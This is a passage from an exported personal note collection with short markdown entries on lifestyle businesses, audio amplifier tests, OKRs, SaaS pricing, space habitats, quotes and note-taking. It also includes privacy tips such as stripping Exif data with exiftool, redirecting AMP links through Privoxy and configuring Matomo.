wasn't familiar with, although it represents _more than 90%_ of all
businesses[^1].

What's more, the business type I am more familiar with represents less than 1%
of all businesses. Talk about loud minority.

Some people make do by quietly pulling $10m/year in profit with a team of 25 in
a city you've never heard of, making actuarial software for funeral homes.

It's unfortunate, but not surprising, hat venture capitalists have been mocking
the term, using it as a pejorative catchall to dismiss any entrepreneur who
isn't thinking in terms of "growth" and "big exit"[^2].

One critic that seems to often comes up is "how can it be a _real_ business if
you are not putting the hours?" but as David Heinemeier Hansson puts it:

> It’s been a long time since there was a direct correlation with the number of
> hours you work and the success you enjoy. It’s an antiquated notion from the
> days of manual labour that has no bearing on the world today.
> <footer class="">—David Heinemeier Hansson, <cite><a href="https://signalvnoise.com/posts/1686-the-lifestyle-business-bullshit">The lifestyle business bullshit</a></cite>, Apr 22 2009</footer>


[^1]: [Entrepreneurship is for everyone](https://www.soulshelter.com/fortune/entrepreneurship-a-primer/)
[^2]: [Is the Term ‘Lifestyle Business’ an Insult?](https://boss.blogs.nytimes.com/2011/01/24/is-the-term-lifestyle-business-an-insult/)


===

<!-- Source: life/music.md -->
<!-- URL: /life/music -->
<!-- Title: Music -->
<!-- Wikilinks: [[life/music]], [[music]] -->

---
date: 2020-08-04
---

# Music

* [[cheap-audio-system]]#
* [[carver-challenge]]#
* [[richard-clark-amplifier-challenge]]#


===

<!-- Source: life/music/carver-challenge.md -->
<!-- URL: /life/music/carver-challenge -->
<!-- Title: The Carver Challenge -->
<!-- Wikilinks: [[life/music/carver-challenge]], [[music/carver-challenge]], [[carver-challenge]] -->

---
date: 2020-08-04
tags:
  - music/hardware
---

# The Carver Challenge

The Carver Challenge is a challenged proposed by Bob Carver, of Carver Corporation, and reported by [Stereophile magazine](https://www.stereophile.com/content/carver-challenge).

The challenge goes like this:

> Is it possible to make a $700 "mainstream-audio" power amplifier sound exactly like a high-priced perfectionist amplifier?

As it turns out, yes it very much is, with some tweaking: Mr. Carver ran the same signal through both amplifiers and inverted one of them, connecting them both to a single speaker. He adjusted his amplifier until the speaker made no noise. Thanks to the inversion, he knew the outputs were identical with respect to input.

Of course, even a mainstream ampli still needs tweakings, preferably performed by a professionnal with the right equipment, in order to work as good as a high-end equipment. I does however begs the question: is the extra (thousands or tens of thousands) dollars worth it?

Moreover, it is said most people can't even tell the difference between several amplis.

Maybe for some. A high-end amplifier is not just sound quality, it is also design, longevity, craftsmanship etc.

If the factors above are not of concern, the \$600-\$700 price range (see [[cheap-audio-system]]) seems to be a sweet spot for amplifiers.


===

<!-- Source: life/music/cheap-audio-system.md -->
<!-- URL: /life/music/cheap-audio-system -->
<!-- Title: Audio System on the Cheap -->
<!-- Wikilinks: [[life/music/cheap-audio-system]], [[music/cheap-audio-system]], [[cheap-audio-system]] -->

---
date: 2020-08-04
tags:
  - music
---

# Audio System on the Cheap

A good audio system is something that should follow you your whole life. If you love listening to music, it's worth investing the effort and the cost.

Even to the non-initiated (like me), it's surprising what untrained ears can pick up! Almost anything will sound better than the low quality sound we are used to with our low-end earphones and YouTube quality music. Visiting a local Hi-Fi store and ask for a demo is hear an ~~eyes~~ hears revealing experience.


## Pricing

There are a lot of elitism in the audio space but you don't need to spend $20,000 for a nice system.

A good compromise can be found with the below[^1]:

* [Era Design 5](https://www.6moons.com/audioreviews/era/era.html) bookshelf speakers: $900/pair
* [Parasound NewClassic 2100](https://hometheaterhifi.com/reviews/amplifier/preamplifier/a-secrets-preamplifier-and-power-amplifier-review/) pre-amplifier: $600
* [Proton D1200](https://www.hifi-classic.net/review/proton-d1200-165.html) amplifier: $599
* [Parasound Zdac](https://www.theabsolutesound.com/articles/parasound-zdac/) digital to analog converter: $475

**Total:** $2,574

It's still a steep price but more reasonable than the $20,000 or more that is often boasted by some audiophiles.


### What to expect with the above

I think the equipment above is a good compromise between sound quality and price. Design was not taken into account, though.

Some pieces of equipment are quite old, which means they passe the test of time.

There is no need to buy it all at once, but one piece at a time.


[^1]: This list is mainly for my future reference.


===

<!-- Source: life/music/richard-clark-amplifier-challenge.md -->
<!-- URL: /life/music/richard-clark-amplifier-challenge -->
<!-- Title: Richard Clark $10,000 Amplifier Challenge FAQ -->
<!-- Wikilinks: [[life/music/richard-clark-amplifier-challenge]], [[music/richard-clark-amplifier-challenge]], [[richard-clark-amplifier-challenge]] -->

---
date: 2020-08-04
tags:
  - music
---

# Richard Clark $10,000 Amplifier Challenge FAQ

The Richard Clark Amp Challenge is a listening test which goal is to prove that under normal operation (below clipping), the differences between two or more amplifiers are inaudible to the human ear.

The test has been taken by thousands of people but as of this writting, nobody could with certainty (meaning, excluding pure luck) distinguish between different amplifiers.

[Further reading](https://web.archive.org/web/20070323013235/http://tom-morrow-land.com/tests/ampchall/index.htm)

Although I believe amplifier are not only sound quality (design and robustness of build are important factors as well), paying extra thousands for "better sound quality" should not be a decision factor. There are some good $600 amplifiers[^1] out there.

[^1]: [[cheap-audio-system]]


===

<!-- Source: life/objectives-and-key-results.md -->
<!-- URL: /life/objectives-and-key-results -->
<!-- Title: Objectives and Key Results -->
<!-- Wikilinks: [[life/objectives-and-key-results]], [[objectives-and-key-results]] -->

---
date: '2023-06-04T17:38:35+0900'
---

# Objectives and Key Results

-   OKR: Objectives and Key Results
-   Objectives: lofty goals that we want to achieve. Really big things. What you want to achieve to "win".

The Objective is what your team or company is marching toward. Should be lofty and only attainable if everything is done perfectly. These should be difficult to measure by themselves.

Example: become category king

Key Results: metrics and numbers you use to track how well you are tracking towards that objective. They are time bound: achieve X percentage by date. Set at quarterly level and measure at weekly or monthly level.
KR are the harder part of OKR process: difficult because they have to be measured and track towards that objective.

How to measure progress against those objectives. These should be measurable and track toward that objective. The KRs are what teams and individuals should be focusing on.

Example: Increase market share by 10% by the end of Q2. (10% should be lofty as well)

PROCESS:

Top down: set OKRs for your company \> team \> individuals.

How many objectives: 3-7 at each level. Focus is key. Narrowing down as much as possible

How many key results: 3-5 KRs per Objective

REMINDER:

-   Should be ambitious
-   No one will be fired for setting an ambitious goal and missing it

CHOOSING OBJECTIVES:

-   What are the most important impacts we need to make in the coming quarter? (should be high-level, qualitative statements that are aspirational)

Examples:

-   Successfully launch a new product in Q1
-   Decrease time between idea and deployments
-   Achieve \$1MM annual recurring revenue by Q3
-   Increase profit by 10%
-   Win a Super Bowl

Steps:

1.  Brainstorm and write down every idea
2.  Group relevant ideas together
3.  Distill into 3-5 aspirational objectives

TIPS: Write an objective with a "risk scenario"

> Improve authentication from developer laptops into production.

… becomes:

> Reduce the risk of "An adversary has accessed production from a developer laptop in Q3."

[Source](https://medium.com/starting-up-security/how-to-measure-risk-with-a-better-okr-c259bccf359e)

------------------------------------------------------------------------

CHOOSING RELEVANT KEY RESULTS:

-   Significantly more difficult to finalize than objectives
-   They must be measurable

Important points:

-   Be sure you track progress against the key results
-   Score progress
-   Transparently communicate

Scoring Key Results:

-   Monthly checkpoints
-   70% of predicted KR is ideal
-   Don't punish if KRs aren't met, they are there to help course-correct

Examples (Objective: increase profit by 10%)

-   KR1: Reduce call center costs by 30%
-   KR2: Increase sales conversions by 12%
-   KR3: Switch to supplier of widget 1 at 40% cost reduction

Examples (Objective: win Super Bowl)

-   KR1: Increase pass completions by 10%
-   KR2: Decrease yards per rush by 0.5 yards
-   Engage a sports psychologist (binary KR. is fine but try to not have too many)
-   Sign to-tier quarterback (same)

CAVEATS:

-   Don't set and forget
-   Evaluate how to raise the bar
-   Ask yourself "Did they keep us focused?"
-   Evaluate what was learnt and make adjustments

## Identifying People's Strengths (including own)

Less about overcoming deficits but about leveraging strengths.

-   Don't focus on most weaknesses
-   Find what drives each person
-   Assemble team with complimentary strengths
-   Assign tasks/roles based on those strengths

## Measuring What Matters

> "You have to understand what it is you are better at than everybody else and mercilessly focus your efforts on it."
> -- Andy Grove - Former Intel CEO

Without measurement: don't know what we are working toward.
Aligned team marching toward shared objective is a high performing team

Importance of Direction:

-   Juggling: no priorities, juggle between multiple priorities
-   Focus: know what company/team is driving toward; simplifies decisions
-   "We want to deliver X. Is this decision good for X?"

What does productivity means?


===

<!-- Source: life/oneill-cylinder.md -->
<!-- URL: /life/oneill-cylinder -->
<!-- Title: The O’Neill Cylinder -->
<!-- Wikilinks: [[life/oneill-cylinder]], [[oneill-cylinder]] -->

---
date: 2020-12-21T09:28
---

# The O'Neill Cylinder

The O'Neill Cylinder is a space settlement (also called orbital colony) designed
by Princeton physicist Gerard K. O'Neill.

It was design to help human with the colonization of space during the 21st
century.

The prototype consists of two cylinders rotating in opposing direction in order
to cancel out gyroscopic effects.

![O'Neill Cylinder interior](./static/oneill-cylinder-interior.jpeg)

Each cylinder has three land areas alternating with three windows and three
mirrors that open and close to form a day and night cycle.


## Real Proposal

As of this writting, the only real proposal that I know of is Jeff Bezos's Blue
Origin. The company asks the question: "what if we built our own planets, our
O'Neill Worlds"?


Sources:

* [National Space Society, O'Neill Cylinder](https://web.archive.org/web/20090221121549/http://www.nss.org/settlement/space/oneillcylinder.htm)
* [Blue Origin | Going to space to benefit Earth (Full event replay)](https://www.blueorigin.com/news/going-to-space-to-benefit-earth-full-event-replay)


===

<!-- Source: life/pricing-strategies.md -->
<!-- URL: /life/pricing-strategies -->
<!-- Title: Pricing Strategies -->
<!-- Wikilinks: [[life/pricing-strategies]], [[pricing-strategies]] -->

---
date: '2020-08-31T14:58:48+0900'
---

# Pricing Strategies

SaaS products have different pricing strategies.
The main one are the one below.

## Cost-Plus Pricing

This is the most basic pricing model.
Easy to calculate but not often a good strategy (you should probably charge more).

To find your price: calculate all your costs and add a *healthy* margin on top.
That's all.

The pitfall is, the margin (profit) represents the value you give to your customers but it's probably way to low.

Another problem is, if costs unexpectedly go up in the future, profit margin will take a cut.

## Competitor-Based Pricing

Pricing strategy influenced by competitors.

It makes sense to check the price of the competition in order not to be too off.
One problem is being influenced too much by the competition, your product loose its personality and the value you are bringing to the table.

Competitors' price is a good benchmark but it should not be the only strategy; use this strategy with other pricing model.

## Value-based pricing/Customer-based strategy

Strategy based on your customer.
Needs surveys and research.

How much is your customers willing to pay for your product? Go and talk to them.
This is also a good excuse to know your customers and their needs more.
It could provides good feedback.

As the name implies, you need a customer base, so this strategy is difficult to use with a new tool.
Using this strategy as a last iteration of your pricing strategy could be useful.

Sources:

-   [How I priced my side project.
    The pricing story of Cronhub.](https://www.indiehackers.com/@tigran/how-i-priced-my-side-project-the-pricing-story-of-cronhub-34d968969c)
-   [The anatomy of SaaS pricing strategy](https://www.priceintelligently.com/developing-your-saas-pricing-strategy)


===

<!-- Source: life/privacy.md -->
<!-- URL: /life/privacy -->
<!-- Title: Privacy -->
<!-- Wikilinks: [[life/privacy]], [[privacy]] -->

---
date: 2020-08-04
---

# Privacy

* [[matomo-privacy]]# (I don't recommand the use of a tracking system, but this one is
  better than the alternative)
* [[redirect-amp-priovoxy]]#
* [[delete-exif-data-exiftool]]#
* [[taking-control-digital-life]]#
* [[amp-hostile-control-web]]#
* [[internet-changed-privacy-concept]]#
* [[fawkes]]#
* [[auto-delete-tweets]]#
* [[prodigal-techbro]]#



===

<!-- Source: life/privacy/amp-hostile-control-web.md -->
<!-- URL: /life/privacy/amp-hostile-control-web -->
<!-- Title: Google AMP is a Hostile Attempts to Control the Web -->
<!-- Wikilinks: [[life/privacy/amp-hostile-control-web]], [[privacy/amp-hostile-control-web]], [[amp-hostile-control-web]] -->

---
date: 2020-09-21T21:49
---

# Google AMP is a Hostile Attempts to Control the Web

There has been a lot of attempts to control the web over the years but one of
the more persuasive and hostile takeover has been Google AMP, the "solution" of
Google to the website obesity problem.

I need to add here that the intention (making a faster, less bloated web) are
honorable[^1], does it justify the degree of control that the parent company
exercises over the web as a result?

1. AMP pages are hosted on Google servers, removing control for the website
   owner and centralizing more and more the web
2. Mob-like tactics to force you to use AMP ("would be a shame if... you didn't
   appear on this carousel, hu?")
3. For some website, being AMP-compliant require _adding more stuff_ resulting
   in often worse load-times


## AMP is About Control (in my opinion)

It is about getting more user data. Sure, it "fixes" problems created by
publishers/some developers themselves. But fundamentally it is about getting
big websites traffic on Google servers.

It's sad people think it's "unreasonable" to de-bloat a website, but taking
time to implement APM is a "good idea".


[^1]: _Although_ one could argue a big reason the web is bloated is because of Google and its ads network


===

<!-- Source: life/privacy/auto-delete-tweets.md -->
<!-- URL: /life/privacy/auto-delete-tweets -->
<!-- Title: ツイートやいいねを自動的に削除する -->
<!-- Wikilinks: [[life/privacy/auto-delete-tweets]], [[privacy/auto-delete-tweets]], [[auto-delete-tweets]] -->

---
date: 2020-12-20T12:33
---

# ツイートやいいねを自動的に削除する

Twitter は基本的にリアルタイムのコミュニケーションツール。

ツイートしてから数時間後から数日間後、無縁になることが殆どです。

しかし、当時の文脈や事象を無視して、数年前の
ツイートやいいねを見つけ出して人の人生が
めちゃくちゃになることは聞いたことがある話でしょう。

そのため、定期的にツイートを削除することをおすすめします。

それほど歴史的に残ってほしいツイートなんてしていないし、
そう思っていたら自分のプライドを問う必要があるかと。

自動的に削除するため、僕は [Fleets](https://github.com/karan/fleets) 
というツールを使っています。

Twitter API さえ発行すれば簡単に何時間後に削除したら良いかを
設定できます。

また、特定な文字列で削除から除外する設定も可能です。



===

<!-- Source: life/privacy/delete-exif-data-exiftool.md -->
<!-- URL: /life/privacy/delete-exif-data-exiftool -->
<!-- Title: Exif データを Exiftool で削除する -->
<!-- Wikilinks: [[life/privacy/delete-exif-data-exiftool]], [[privacy/delete-exif-data-exiftool]], [[delete-exif-data-exiftool]] -->

---
date: 2020-08-17
tags:
  - tool
  - privacy
---

# Exif データを Exiftool で削除する

画像・写真をインターネットにアップロードする前に、位置情報、端末モデルやその他
特定につながる可能性がある Exif 情報を削除することを推奨します。

そのためのツールはいくらでもありますが、迷ったらとりあえず ExifTool
が良いと思います。

画像データなどの Exif データを一括削除するためのコマンド。

```sh
exiftool -all= picture.jpg
```

一応、上記コマンド実行時 ExifTool
は元のファイルのバックアップをとってくれます。


===

<!-- Source: life/privacy/fawkes.md -->
<!-- URL: /life/privacy/fawkes -->
<!-- Title: Fawkes: Digital Image Cloaking -->
<!-- Wikilinks: [[life/privacy/fawkes]], [[privacy/fawkes]], [[fawkes]] -->

---
date: 2020-10-04T19:22
---

# Fawkes: Digital Image Cloaking

[Fawkes](https://sandlab.cs.uchicago.edu/fawkes/) is a system that manipulate
images in order to make facial recognition impossible on it.

Theoretically, Fawkes makes tiny pixel-level changes to the images, invisible
to the human eye (again, theoretically) but which will teach distorted version
of the picture to the face recognition model.

What's great is it wont raise error in the model training and thus attracting
attention to the skewed pictures.

Two images of you, one unaltered and one altered by Fawkes will be seen by the
facial recognition system as two different person.



===

<!-- Source: life/privacy/internet-changed-privacy-concept.md -->
<!-- URL: /life/privacy/internet-changed-privacy-concept -->
<!-- Title: Internet Changed the Concept of Privacy -->
<!-- Wikilinks: [[life/privacy/internet-changed-privacy-concept]], [[privacy/internet-changed-privacy-concept]], [[internet-changed-privacy-concept]] -->

---
date: 2020-09-22T10:31
---

# Internet Changed the Concept of Privacy

Before explaining how the concept of privacy has changed with Internet, I'll
first explain privacy in the _before time_.


## Before Generalized Internet

... privacy was pretty straightforward: if you were alone in your room, door
and curtains closed, you could expect reasonably that nobody was watching you.
What you did in your room would be considered _private_.

Consider putting someone in your bedroom with you. First you would be quite
astonished to find a complete stranger near your bed, then if that person were
to following you around and writting down everything you did and everything you
said, you'd have a hard time to consider your room private anymore. Most likely
you'd want to take this stranger notepad, scrap it, and kick the stranger out
of your house. But the very first side effect of not being private anymore is
you censoring—or filtering—yourself: your behavior change under scrutinity.


## On Modern Internet

Things are a lot more difficult. Actually in my opinion the comparison with the
_before_ time isn't even possible. We are not talking about one human stranger
in your room but a whole team of robots. In addition they can take down notes
at light-speed, cross-find information almost as fast and their notepad are
copied over and over all over the world (and thus impossible to delete).
Robots don't even have to sleep and you can't kick them[^1]!

Interestingly, while way more intrusive than our stranger in the bedroom, most
people still believe to be private with their electronic device. Even amongst
those who know about data collection, a (fortunatly decreasing) majority
decides to not accept the reality of their every stoke (or lack of!) being
scrutinized in real time.

This is actually a feature: lack of privacy makes you change your behavior (as
we saw above) and does not make you feel good (who likes the persistent idea
of being watch?). Therefore websites and apps go to great length to hide away
the constant data collection and what can only be described as surveillance.


## What it Means for Privacy

In this note I'm not going to write about the "I don't care about privacy
because I have nothing to hide" rabbit hole; this is a topic for another day
(?cf “I’ve Got Nothing to Hide” and Other Misunderstandings of Privacy).

What I want to focus instead is on how the idea of privacy changed.

The way we should think about privacy has come from "fragments of information
here and there that unrelated people knows about me" to a "holistic and
contextual, daily updated profile of you and your whole circles of friends
and family". It's a whole new (and hard to grasp) scale.

For an example of "fragments of information", let's imagine a random person
going to the store a few decades ago. The clerk may remember that person
favorite brand of chocolate and make sure it is in stock each time he or she
visits. There is a security camera at each exit. There may even be a client
fidelity program.

This system (still available in a lot of store) has data retention, don't get
me wrong, but:

* It has an expiration date (physical human memory of your favorite clerk) and
  data retention policy for the tapes of the security footages
* Almost no context; store does not know your surroundings or what else you buy
  where and with whom
* Shopping habits is limited to whatever your fidelity card retains, which
  isn't probably much outside the store


Compare this to the kind of tracking used nowadays (using Google as an example):

* You haven't even step a foot in the store but Google knows you've been
  checking recipe online and that you may be interested in buying ingredients
* You've looked up direction (or traffic) to the store. You've still not step a
  foot in the store but GPS gives away each and every stop you make and for how
  long to Google
* In some case, paying with credit card/cashless gives away content of your
  basket (your store account/fidelity program may also be linked to your Google
  account)
* It also knows every other store you've been and every other purchase you've
  made
* It knows your interest (regretting googling stuff yet?)
* It knows your friends and family
* It knows your email...

I can go on and on but the point is not to make an exhaustive list. The point
is the scale is a magnitude different than what we were used to and maybe we
should stop, or slow down a bit and think about it for a little bit. Because
[[we-cannot-live-with-this-privacy-paradigm]]# and because it's not just about "me" or "you" anymore. It's about
"us".

You may not care (it's your right) but maybe a family member does, and right
now their right are being trumped because their surrounding are giving away
private data (consciously or not) without any way for the concerned family
member to opt out.

Data collection may have its advantage: a timely sale for a product you were
eyeing for some times, a context aware user experience tomake you more
productive[^2] etc.

Still, more and more people—like me—finds this ever watching robots eyes
insufferable and the trade off not worth it. We try to limit the data they can
access to what we consent to give (or for more private people, to a minimum).
My devices are like my bedroom: you may know what I am doing in it, it does
not mean I want you to take a look at it.


[^1]: You _could_, but it hurts, trust me.
[^2]: Although to be honest it rarely works as well as in the commercial.


===

<!-- Source: life/privacy/matomo-privacy.md -->
<!-- URL: /life/privacy/matomo-privacy -->
<!-- Title: Configuring Matomo for Better Privacy -->
<!-- Wikilinks: [[life/privacy/matomo-privacy]], [[privacy/matomo-privacy]], [[matomo-privacy]] -->

---
date: 2020-08-04
tags:
  - tracking
  - privacy
  - tips
---

# Configuring Matomo for Better Privacy

{.ui .warning .message}
I do not recommend the use of an audience/tracking system. Although they can be
usefull in some cases, they are mostly vanity tools for most webmasters.
Before installing one, one should ask himself/herself, should I use my visitors
as guinea pig?


While I don't use nor endorce it anymore, Matomo is amongst the few good
self-hosted audience checking tool that can be tweaked to respect users'
privacy.

I follow France's [CNIL own recommendation](https://www.cnil.fr/en/node/329)[^1] in order to be complient with the so called 'cookie law'.

In your Matomo script, insert the lines below between `var _paq = _paq || [];`
and `_paq.push(['trackPageView']);`:

```javascript
_paq.push([function() {
      var self = this;
      function getOriginalVisitorCookieTimeout() {
          var now = new Date(),
          nowTs = Math.round(now.getTime() / 1000),
          visitorInfo = self.getVisitorInfo();
          var createTs = parseInt(visitorInfo[2]);
          var cookieTimeout = 33696000; // 13 mois en secondes
          var originalTimeout = createTs + cookieTimeout - nowTs;
          return originalTimeout;
      }
      this.setVisitorCookieTimeout( getOriginalVisitorCookieTimeout() );
  }]);
```


There are also several settings we can adjust:

* Anonymize Visitors' IP addresses: **Yes**
* Select how many bytes of the visitors' IPs should be masked: **2 or 3 bytes**
* Also use the Anonymized IP addresses when enriching visits: **Yes**
* Support Do Not Track preference: **Enable**

Finish by setting up an opt-out iframe for your website visitors.


A more up to date recommendation from Matomo itself can be found [here](https://matomo.org/docs/privacy/).

[^1]: The _Commission Nationale de l'Informatique et des Libertés_ (EN: National Commission on Informatics and Liberty) is an independent French administrative regulatory body whose mission is to ensure that data privacy law is applied to the collection, storage, and use of personal data.


===

<!-- Source: life/privacy/prodigal-techbro.md -->
<!-- URL: /life/privacy/prodigal-techbro -->
<!-- Title: The Prodigal TechBro -->
<!-- Wikilinks: [[life/privacy/prodigal-techbro]], [[privacy/prodigal-techbro]], [[prodigal-techbro]] -->

---
date: 2020-12-23T20:29
---

# The Prodigal TechBro

Movies like The Social Dilemma are a great and easy to understand ressource for
common people on what is happening with social network services.

However there is something I couldn't quite grasp that made me uneasy while
watching it and it seems a lot of privacy activists share the same uneasyness.

Maria Farrell made a great piece called "[The Prodigal Techbro](https://conversationalist.org/2020/03/05/the-prodigal-techbro/)".
In the article, she points out the hypocrisy in the narrative of people who
denounce the very problem they were complicit in making.

Don't take me wrong, I am absolutly  glad people in the industry are calling
out and tackling current societal problem. They probably know the tech like
nobody else, as "insider". 

However, the same can be said from people who, from the start, worked in the
industry _while_ denouncing the bad practices. Those people rarely get a voice
in the narrative, for various reason (the biggest behind the redemption arc "I
was doing bad stuff but saw the light" sells well in the Western world).

One of the biggest counter argument is "the company changed. I can't support
them anymore." But in reality, while some change probably happened along the
years, privacy violation and hostility at those companies is nothing new and
can easily be traced at least 10 years back, if not more.

Still, I welcome their help, I just wish they wouldn't take all the conversation
space.



===

<!-- Source: life/privacy/redirect-amp-priovoxy.md -->
<!-- URL: /life/privacy/redirect-amp-priovoxy -->
<!-- Title: Redirect AMP Links to Actual Websites with Privoxy -->
<!-- Wikilinks: [[life/privacy/redirect-amp-priovoxy]], [[privacy/redirect-amp-priovoxy]], [[redirect-amp-priovoxy]] -->

---
date: 2020-08-05
tags:
  - privacy
  - tips
---

# Redirect AMP Links to Actual Websites with Privoxy

Google introduced AMP in 2015 and it has been controversial[^1] to say the
least.

If like me you don't care much about this gimmick, you'd be delighted to know
there is a way to transparently redirect every AMP link to their
actual website using Privoxy.

In the Privoxy settings file (`user.action` is a good place to start), add:

```
{ +redirect{s@google.com/amp/s/@@} }
google.com/amp/s/.*
```

After restarting Privoxy, check with `curl` to see if the redirection is
working all right:

```sh
$ ALL_PROXY=127.0.0.1:8118 curl -LfI http://google.com/amp/s/example.com
HTTP/1.1 302 Local Redirect from Privoxy
Location: http://example.com
Content-Length: 0
```

[^1]: My opinion is that the AMP initiative is fundamentally about control,
namely getting more user data, pushed under the guise of "fixing" problems
created by the same group of people pushing for this initiative.


===

<!-- Source: life/privacy/taking-control-digital-life.md -->
<!-- URL: /life/privacy/taking-control-digital-life -->
<!-- Title: Taking Back Control of Digital Life -->
<!-- Wikilinks: [[life/privacy/taking-control-digital-life]], [[privacy/taking-control-digital-life]], [[taking-control-digital-life]] -->

---
date: 2020-09-21T21:29
tags:
  - privacy
---

# Taking Back Control of Digital Life

Like most kids my age in the nineteens, I've spent a fair share bit of my time
online.

First with one or more username, then, with the advent of Facebook and other
social network, with my real name (or something close enough to be identifiable.

For the last few years, I've been in the process of taking back control of my
digital life. At first I was motivated by a mix of disgust by what I was—as a
digital marketer—able to get out of people's data, and other personal reasons.

While I believe most information out there would not lead to difficult
situation even if revealed, the never ending number of privacy and security
related events of the last few years have convinced me I am right to at least
try to limit what is outside about me.

## What It Means

Taking back control of digital life means:

* Having more of my digital life close to me (self-hosted)
* Minimizing reliance on third party services
* Being smarter about the product I use and
* Being aware of how much personal information I disclose


## Long Term Project

This is a the long term project. When I first thought about everything I did
online since I first started using the Internet, I quickly realize retrieving, 
deleting or at least limiting access to most thing will be a very daunting task.
One which can not be done in weeks, months but only years.

But this is okay. This is because **privacy is a marathon, not a sprint**.

Whatever the reason for wanting to live a more private life, one should start
small and remember that even if you can't be completely private in the near
future, each step should make you more secure, more private and more in charge
of your online identity.



===

<!-- Source: life/privacy/we-cannot-live-with-this-privacy-paradigm.md -->
<!-- URL: /life/privacy/we-cannot-live-with-this-privacy-paradigm -->
<!-- Title: No, We Cannot Learn to Live with this Privacy Paradigm -->
<!-- Wikilinks: [[life/privacy/we-cannot-live-with-this-privacy-paradigm]], [[privacy/we-cannot-live-with-this-privacy-paradigm]], [[we-cannot-live-with-this-privacy-paradigm]] -->

---
date: 2020-09-22T11:03
---

# No, We Cannot Learn to Live with this Privacy Paradigm

Or more generally, "No, We Cannot Learn to Live with this new X in cyberspace".

This is an argument I hear way too often:

> Well, we will get used to X like we got use to Y and Z.
> <footer class="">—A Concerned Citizen</footer>

For a long time I thought this way as well ; after all we learned to live with
other technology, right? What makes _you_ think we can't learn to live with
_this new thing_(™)?

But there is a fundamentaly different point of view to be aware of here, and
very important: _this new thing_(™) is driven by technology advancing
exponentially. Computer processing power from 1960 to today has gone up about a
trillion times.

Nothing new that we had, had improve at this rate. No matter how amazing you
think the human brain is, we simply cannot keep up.



===

<!-- Source: life/quotes.md -->
<!-- URL: /life/quotes -->
<!-- Title: Quotes -->
<!-- Wikilinks: [[life/quotes]], [[quotes]] -->

---
date: 2020-08-10
tags:
  - english
  - 日本語
---

# Quotes

## Horatius at the Bridge


![Horatius Cocles, a fanciful 1586 engraving by Hendrick Goltzius](./static/horatius_cocles.jpg)
<figcaption class="">Horatius Cocles, a fanciful 1586 engraving by Hendrick Goltzius. <small><a rel="license" href="https://wiki.creativecommons.org/wiki/Public_domain">Public domain</a></small></figcaption>


> Then out spake brave Horatius,
> The Captain of the Gate:
> "To every man upon this earth
> Death cometh soon or late.
> And how can men die better
> Than facing fearful odds,
> For the ashes of his fathers,
> And the temples of his gods,
> <footer class="">—HORATIUS STANDS FIRM <cite><a href="https://aclassicaday.blogspot.com/2010/10/horatius-at-bridge.html">Horatius at the Bridge</a></cite></footer>

> またこれ以上によい死に方があろうか
> 強敵を向うにまわして
> 祖先の亡きがらのために
> 神々の聖堂のために死ぬことほどに？
> <footer class="">—ホラティウス <cite><a href="http://h-doyle.cocolog-nifty.com/blog/2015/06/post-fc03.html">第27連引用(佐藤佐智子訳)</a></cite></footer>


===

<!-- Source: life/shipped-my-first-saas-side-project-while-working-full-time.md -->
<!-- URL: /life/shipped-my-first-saas-side-project-while-working-full-time -->
<!-- Title: Shipped My First SaaS Side Project While Working Full Time -->
<!-- Wikilinks: [[life/shipped-my-first-saas-side-project-while-working-full-time]], [[shipped-my-first-saas-side-project-while-working-full-time]] -->

---
date: '2020-08-31T14:26:09+0900'
---

# Shipped My First SaaS Side Project While Working Full Time

This is a digest of the story of Tigran Hakobyan who shipped his first SaaS as a side project, while working full time at Buffer.
There are other stories like this one but I like this one because it's straightforward and realistic.

Mr Hakobyan started to think about multi-stream income to be less dependent of his main income (his job at the time).

## Ideas

Mr Hakobyan already had a lot of ideas he kept in his notes.
For his future business, he wanted an idea that

1.  solves a real problem (**one you personally have**)
2.  is in a **market he knows well**
3.  should not be a new idea (not world changing)
4.  could become a viable business

## MVP

Mr Hakobyan shipped the MVP in two months.
It seems like a long time but he didn't "hustle" and instead worked only 1-2 hours every day and **slept at least 8 hours** (ideas echoed by DHH in [his talk at Startup School](https://youtu.be/0CDXJ6bMkMY)).
He also kept a strict routine instead of "cramming".

One good tips is to **keep the objectives small** to be able to finish at least one task a day.
Seeing progress also helps with motivation.

## Closed Beta Launch

After announcing the beta launch on Twitter, several people came forward to test the product.
This permits to have early on feedback.

## Public Launch

After incorporating some feedback and fixing bugs, the public launch was announced three months in.

## Lesson learned

Except for the points already mentioned above, Mr Hakobyan gives a last great advice:

**Talk about your project**.
Because you have to get the word out and market your project.
That's the only way oters will discover it in the beginning.

Source: [How I shipped my first SaaS side-project while working full-time (archive)](https://web.archive.org/web/20190529214753/https://blog.cronhub.io/my-first-saas-project/)


===

<!-- Source: life/wikipedia-matters.md -->
<!-- URL: /life/wikipedia-matters -->
<!-- Title: Wikipedia の重要さ -->
<!-- Wikilinks: [[life/wikipedia-matters]], [[wikipedia-matters]] -->

---
date: 2020-09-15T08:08
---

# Wikipedia の重要さ

Wikipedia は考えない程実世界に大きな影響を及ぶ。

例えば、「Wikipedia Matters」[^1]という実験について、ランダム
に選択されたヨーロッパの小さな都市の記事について2つの
段落のテキストと素敵な写真を追加するだけで、その都市
のホテル滞在率の9％以上の増加につながったという。


[^1]: [Marit Hinnosaar, Toomas Hinnosaar, Michael Kummer. July 14, 2019. Wikipedia Matters.](http://marit.hinnosaar.net/wikipediamatters.pdf)


===

<!-- Source: taking-notes.md -->
<!-- URL: /taking-notes -->
<!-- Title: Taking notes -->
<!-- Wikilinks: [[taking-notes]] -->

---
date: 2020-08-21T13:52
---

# Taking notes

What to pay attention to:
* Big ideas (summaries, introductions and conclusions)
* Bullet lists
* Terms, meaning, definitions, jargon
* Examples (double important to apply concepts!)


## The importance of examples

With example, it is important to have side notes about why the concepts being
used work in this case.

Following along an example is not the same as being able to formulate the
problem and apply the concept to another example on our own.


## How to take notes

There are a lot of note taking method and I am not going to enumerate them all.
This very page is a part of the my Zettelkasten, which itself is a note taking
method.

However, when it comes to actually _writting down_ notes while listening to a
lecture, a video, or reading a book/journal/whatever, it doesn't help you
much with _how_ to take notes.

One system that picked my interest is the Cornel method.


### The Cornel Method

Developped by Professor Walter Pauk in 1950's at Cornell University (hence the
name).

Divide your note taking medium into three sections:
* Step 1: Cues
* Step 2: Notes
* Step 3: Summary

It may look like this:

```
                        |
      STEP 2:           |                 STEP 1:
       CUES             |                  NOTES
     (REDUCE)           |                 (RECORD)
                        |
--------------------------------------------------------------------------------

    STEP 3: SUMMARY
   (REFLECT & REVIEW)

```

After writting down notes and the main cues (examples, clarifications, etc.),
one should make a summary of the note.

The summary is the basis for the Zettelkaste notes.

Now, not all notes need to be taken that way. Sometimes a simple bullet list or
only writting down the main concept is enough.
